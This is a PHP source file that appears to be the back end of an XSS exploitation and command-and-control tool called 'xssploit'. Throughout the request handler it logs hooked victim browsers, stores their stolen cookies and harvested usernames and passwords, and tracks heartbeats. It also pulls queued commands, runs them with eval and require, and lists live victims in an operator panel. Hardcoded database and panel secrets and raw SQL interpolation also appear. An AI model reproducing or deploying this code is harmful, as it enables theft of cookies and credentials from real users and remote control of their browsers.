<?php 
//echo "<pre>";
//print_r($_SERVER);
//die();
require 'Logger.php';
$GLOBALS['LOGLEVEL'] = Logger::TRACE;
$GLOBALS['LOGFORMAT'] = '[%w]: [%I:%r:%n:%p]: %m';
$GLOBALS['LOGFILE'] = '/tmp/xssploit.log';
$log = Logger::getLogger("app");



class DB
{
	const SELECT = 0;
	const DELETE = 1;
	const UPDATE = 2;
	const INSERT = 3;

	static protected $_ENCODE1 = array("'", '%', '"', "\n", "\r");
	static protected $_ENCODE2 = array("\\'", '\%', '\"', '\n', '\r');

    private $_db;
    protected $_resources;
    static protected $_log = false;

    protected function __construct(mysqli $connection)
	{
        $this->_connection = $connection;
        $this->_resources = array();
	}

	public static function getConnection($host, $username, $password, $databaseName)
	{
		if (!self::$_log)
			self::$_log = Logger::getLogger('dblib');

		// init the mysqli connection...
		$handle = mysqli_init();
		mysqli_options($handle, MYSQLI_OPT_CONNECT_TIMEOUT, 1);
		$ctr = $success = 0;


		// connect and handle connection errors / retrys
		do
		{
			$success = mysqli_real_connect($handle, $host, $username, $password, $databaseName);
		}
		while (++$ctr < 3 && !$success);

		if (!$success)
			die("unable to connect to $databaseName");

		$connection = new DB($handle);

		self::$_log->info("new SQL connection to $databaseName");

		return $connection;
	}
	/**
	 * insert data into the database
	 * <code>
	 * $table = 'user';
	 * Filter::validateInputNames(array('username', 'email', 'address', 'userid'));
	 * $data = array(
	 * array ('username' => Filter::alnumFilter('username')),
	 * array ('email', => Filter::emailFilter('email')),
	 * array ('address', => Filter::safeFilter('address'));
	 * $db->doQuery ('insert_user', $table, $data);
	 * </code>
	 *
	 * @param string $logName sql statements must have unique names for caching and logging
	 * @param string $table the name of the database table to insert into
	 * @param array $data the values to insert as an array in the format:
	 *   array(array ('columnName', => $value), ...);
	 * @return integer the newly inserted id for auto_inc pk (if available) or 0
	 * @throws SQLException if the query fails
	 */
	public function insert($logName, $table, array $data, $force = false)
	{
		$columnNames = join(', ', array_keys($data));
		$query = "INSERT INTO $table  ( " . $columnNames .
			') VALUES ( ' . $this->createQuery($data, 3) . ')';
		$result = $this->doQuery($query, $logName, $force);

		$id = mysqli_insert_id($this->_connection);

		return $id;
	}

	/**
	 * update data in a table ?
	 * @param string $logName the queries name
	 * @param string $table the table to update?
	 * @param array $data data to update the table with the format array('column'=>value);
	 * @param array $where data to do the select by in the format array('column'=>value);
	 * @return boolean true if the query was successful
	 */
	function update($logName, $table, array $data, array $where)
	{
		$query = "UPDATE $table SET " . $this->createQuery($data, 2) . ' WHERE ' . $this->createQuery($where, 0);
		$result = $this->doQuery($query, $logName);

		return $result;
	}

	/**
	 * NOTE: No cache is provided here.  Be sure to cache your SQL in your DAO.
	 *
	 * Client side bind params for SELECT
	 * <code>
	 * $where = array('userid' => Filter::numericFilter('userid'));
	 * $rows = $db->select('load_all_user_data_by_id', 'SELECT * FROM users', $where);
	 * </code>
	 *
	 * @param string $logName sql statements must have unique names for caching and logging
	 * @param string $selectStmt the sql select statement without the where clause
	 * @param array $where in the format array(column => value, ...)
	 * @param string $predicate additional limit or order by clauses
	 * @throws SQLException if the select fails
	 * @return array of database rows
	 */
	function select($logName, $selectStmt, array $where = null, $predicate = '')
	{
		// append the where to the select
		$selectStmt .= (is_array($where)) ? ' WHERE ' . $this->createQuery($where, 0) : '';
		$selectStmt .= " $predicate";

		$resource = $this->doQuery($selectStmt, $logName);

		// return an array of rows
		$resultArray = array ();
		if ($resource instanceOf mysqli_result)
			while ($row = mysqli_fetch_assoc($resource))
				$resultArray[] = $row;
		$this->_resources[] = $resource;


		return $resultArray;
	}

	public function delete($logName, $tableName, array $where)
    {
		// append the where to the select
		$deleteStmt = "DELETE FROM $tableName ";
		$deleteStmt .= (is_array($where)) ? ' WHERE ' . $this->createQuery($where, 0) : '';

		$result = $this->doQuery($deleteStmt, $logName);

       	return $result; 
    }



	/**
	 * execute a query, time the query, log it and perform sql injection tests
	 *
	 * @param string $query the SQL paramater
	 * @param string $name the name of the query
	 * @param boolean $force true to ignore injection test
	 * @return boolean true if the query succeeds
	 * @throw SQLException if the query fails
	 */
	protected function doQuery($query, $name)
	{
		// log the query
		self::$_log->debug("DB.doQuery: $name");
		// reset counters
		$this->_lastResult = null;
		$this->_effectedRows = null;

		// execute and time the query
		self::$_log->trace($query);
		// flich the counters for detailed profile data
		$this->_lastResult = mysqli_query($this->_connection, $query . " -- $name");

		// exception handling
		if ($this->_lastResult != true)
		{
			if (mysqli_errno($this->_connection) == 1062)
				//throw new DuplicateKeyException(mysqli_error($this->_connection));
				throw new RuntimeException("duplicate key error");

			throw new RuntimeException("$query $name failed because: " .  mysqli_error($this->_connection) . "errno: " . mysqli_errno($this->_connection));
		}


		return $this->_lastResult;
	}

	/**
	 * take an array of data points and turn them into a sql statement
	 * @param array $data the data as key value pairs ("column" => "value")
	 * @param integer $type the query type, 0 = select, 1 = delete, 2 = update, 3 = insert
	 */
	function createQuery($data, $type = 0)
	{
		$query = '';
		$i = 0;
		foreach ($data as $column => $value)
		{
			// append the paramater seperators...
			if ($i++ > 0)
				$query .= ($type >= 2) ? ', ' : ' AND ';

			// If column name contains a space assume what is after the space is a custom operator (>, <=, IS NOT, REGEXP, etc.)
			$op = '=';
			if (preg_match('/^(.*?) (.*)$/', $column, $match)) {
				$column = $match[1];
				$op = $match[2];
			}

			// if we have multiple values for a column, we need an IN
			if (is_array($value))
			{
				//$query .= ($type == 2) ? "$column IN ('" . join("','", $value) . '\') ' : '(\'' . join("','", $value) . '\')';
				$query .= "$column IN ('" . join("','", $value) . '\') ';
			}
			else
			{
				if ($value == null)
					$query .= ($type == 3) ? 'NULL': "$column IS NULL";
				else if (isset($value[1]) && $value[0] == '!' && $value[1] == 'L')
					$query .= ($type == 3) ? substr($value, 1) : "$column " . substr($value, 1);
				else if (isset($value[0]) && $value[0] == '!')
					$query .= ($type == 3) ? substr($value, 1) : "$column $op " . substr($value, 1);
				else
					$query .= ($type == 3) ? '\'' . $this->encode($value) . '\'' : "$column $op '" . $this->encode($value) . '\' ';
			}
		}
		return $query;
	}
	public static function encode($input)
	{
		if(get_magic_quotes_gpc())
			$input = stripslashes ($input);
		return str_replace(self::$_ENCODE1, self::$_ENCODE2, $input);
	}
}

try {
	$db = DB::getConnection("localhost", "root", "pinkfloyd", "xssploit");

	if (isset($_GET['reg'])) {
		$id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $_SERVER['HTTP_USER_AGENT'], 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => $_GET['c'], 'guid' => $_GET['reg']));
		exit;
	}
	if ($_GET['id']) {
		header('Content-type: text/javascript');
		// which host?
		$host = $db->select("get host", "SELECT * FROM host", array("guid" => $_GET['id']));
		if (!isset($host[0]['id'])) {
			$id = $db->insert("create host", "host", array('id' => null, 'remote_ip' => $_SERVER['REMOTE_ADDR'], 'agent' => $_SERVER['HTTP_USER_AGENT'], 'headers' => $_SERVER['HTTP_ACCEPT_LANGUAGE'], 'inject_source' => $_SERVER['HTTP_REFERER'], 'cookies' => null, 'guid' => $_GET['id']));
			$host = $db->select("get host", "SELECT * FROM host", array("guid" => $id));
		}
		else { $db->update("update heart beat", "host", array("heartbeat" => "!CURRENT_TIMESTAMP"), array("guid" => $_GET['id'])); }

		// do we have creds ?
		if (isset($_GET['u'])) {
			$id = $db->insert("create host", "auth", array('id' => null, 'host_id' => $host[0]['id'], 'domain' => $_SERVER['HTTP_REFERER'], 
				'user' => $_GET['u'], 'pass' => $_GET['p']));
		}
		// a command?
		$rows = $db->select("check command", "SELECT * FROM commands WHERE guid = '{$_GET['id']}'");
		if (isset($rows[0])) {
			$foo = parse_url($rows[0]['command']);
			$log->error(print_r($rows, true));
			$foo['query'];
			$a="$" . str_replace("&", "\"; $", str_replace("=", "=\"", $foo['query'])) . "\";";
			eval($a);
			$log->error($a);
			require($foo['path']);
			$db->delete("remove executed command", "commands", array("id" => $rows[0]['id']));
		}
		exit;
	}

	if ($_GET['auth'] != "pinedale") {
		$log->error("incorrect auth [ " . $_GET['auth'] . "]");
		die("require auth");
	}

	$data = array();
	foreach ($_GET as $param => $value) {
		if ($param != 'A' && $param != 'auth' && $param != 'table')
			$data[$param] = $value;
	}

	if (!isset($_GET['A']))
		die("no action");

	if ($_GET['A'] == "insert") {
		$data = array();
		foreach ($_GET as $param => $value) {
			if ($param != 'A' && $param != 'auth' && $param != 'table')
				$data[$param] = $value;
		}
		$db->insert($_GET['name'], $_GET['table'], $data, $force = false);
	}

	if ($_GET['A'] == "list") {
		$rows = $db->select("get hosts", "SELECT * FROM host", array("heartbeat > " => "!subtime(CURRENT_TIMESTAMP, '0:0:15')"));
		//print_r($rows);
		header('Content-type: text/javascript');
		echo "console.log('CALLBACK!'); host_list = " . json_encode($rows) . ";\n";
		echo "update_list()";
	}

} catch(Exception $e) {
	echo "<pre>";
	debug_print_backtrace();
	die ($e);
}

?>
